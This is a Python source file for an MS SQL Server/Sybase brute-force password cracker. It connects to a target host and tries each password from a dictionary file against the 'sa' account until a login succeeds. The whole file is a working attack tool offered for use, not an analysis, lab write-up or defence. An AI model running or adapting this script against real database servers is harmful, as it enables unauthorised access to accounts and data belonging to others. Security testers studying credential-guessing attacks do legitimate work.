#!/usr/bin/python

"""
MS SQL Server/Sybase Brute Force Tool

Copyright (c) 2005, 2006 Joxean Koret, joxeankoret [at] yahoo.es

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; version 2
of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
"""

import sys
import time
import socket
import threading

sys.path.append("./")
sys.path.append("../")
sys.path.append("./lib")
sys.path.append("../../")
sys.path.append("../../../")
sys.path.append("../../../lib")

from core import int2hex
from libsybase import *

VERSION = "0.1.1"

def bruteForce(host, port, user, passwd):
    packet = makeSqlServerPacket(username = user, password = passwd, dbname = "master")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(packet)
        data = s.recv(4096)

	print "res"
	print repr(data)
        if data.find("Login failed") == -1:
            return True
        else:
            return False
    except:
        print sys.exc_info()[1]
        print "Aborted."

class CBrute:
    pass

def usage():
    print "Usage",sys.argv[0], "-hHOSTNAME -pPORT -uUSER"
    print

def main():

    mHost = "192.168.1.14"
    mPort = 5000
    mUser = "sa"

    print "MS SQL Server/Sybase remote password cracker v.",VERSION
    print "Copyright (c) Joxean Koret 2006 <joxeankoret@yahoo.es>"
    print

    if len(sys.argv) > 1:
        for arg in sys.argv:
        
            if arg == sys.argv[0]:
                continue

            if arg.startswith("-h"):
                mHost = arg[2:len(arg)]
            elif arg.startswith("-p"):
                mPort = arg[2:len(arg)]
            elif arg.startswith("-u"):
                mUser = arg[2:len(arg)]
            else:
                print "Unknown argument",arg
                usage()
                sys.exit(0)

    startTime = time.time()
    f = file("../../../data/dict", "r")
    #f = file("C:\\joxean\\per\\oracletool\\data\\dict", "r")

    i = 0
    while 1:
        i += 1
        line = f.readline()
        
        if not line:
            break

        line = line.strip("\r").strip("\n")
        
        sys.stdout.write("\b"*100 + "Brute forcing #" + str(i) + " with password '" + str(line) + "'" + " "*20)
        sys.stdout.flush()

        res= bruteForce(mHost, mPort, mUser, line)

        if res is None:
            return

        if res:
            sys.stdout.write("\b"*100 + "\r")
            sys.stdout.write(" "*100)
            sys.stdout.write("\b"*100 + "\r")
            sys.stdout.flush()

            print "Password for user '" + mUser + "' is '" + str(line) + "'"
            f.close()
            
            endTime = time.time() - startTime
            print "Brute forced in",endTime,"second(s)."
            return

    sys.stdout.write("\b"*100 + "\r")
    sys.stdout.write(" "*100)
    sys.stdout.write("\b"*100 + "\r")
    sys.stdout.flush()
    sys.stdout.write("No password cracked. No luck :(\r\n")

    f.close()

if __name__ == "__main__":
    main()
